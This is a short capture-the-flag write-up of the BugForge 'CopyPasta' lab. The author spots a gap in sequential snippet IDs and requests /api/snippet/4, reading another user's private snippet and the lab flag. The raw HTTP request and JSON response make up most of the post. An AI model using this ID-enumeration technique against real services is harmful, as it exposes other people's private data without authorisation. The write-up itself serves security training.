---
title: "CopyPasta IDOR"
date: 2025-12-2
author: Shawn Szczepkowski
---

Today we will be covering the CopyPasta IDOR lab from [bugforge.io](http://bugforge.io). This is an easy rated lab.

Exploring the labs functionality we note that we can view public snippets. We should also note that when we create snippets we can set them to be private. 

With that information in mind we notice that when viewing public snippets they go in order 1,2,3 etc. but if we are paying attention it's easy to notice snippet 4 is missing. 
Let's send a request to `/api/snippet/4` using repeater and see what we can see.

```sh
GET /api/snippet/4 HTTP/2
Host: 466ae2e4ce44.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0NzIzOTEwfQ.2HJhgM13NNPVuA5cSG60Tydw5drA15z6BsrvUnIStLo
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://466ae2e4ce44.labs.bugforge.io/snippet/9
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Sure enough we are able to view the user `pythonista's` private snippet and retrieve our flag:
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Wed, 03 Dec 2025 01:07:53 GMT
Etag: W/"294-R2SCmHSbGsinmg/50TEE0FYwBW8"
X-Powered-By: Express
Content-Length: 660

{
	"id":4,
	"user_id":3,
	"title":"Password Generator",
	"code":
	"import random\nimport string\n\ndef generate_password(length=12):\n    chars = string.
	ascii_letters + string.digits + \"!@#$%^&*\"\n    return \"\".join(random.choice(char
	s) for _ in range(length))\n\nprint(generate_password())",
	"language":"python",
	"description":"Generate secure random passwords",
	"is_public":0,"share_code":"71e64618-6912-42cf-9f7f-95f77d0a97fd",
	"created_at":"2025-12-03 01:04:43",
	"updated_at":"2025-12-03 01:04:43",
	"username":"pythonista",
	"like_count":0,
	"comment_count":0,
	"user_liked":0,
	"message":"bug{e60dc7702bb490419735e55748429692}",
	"flag":"bug{e60dc7702bb490419735e55748429692}"
}
```
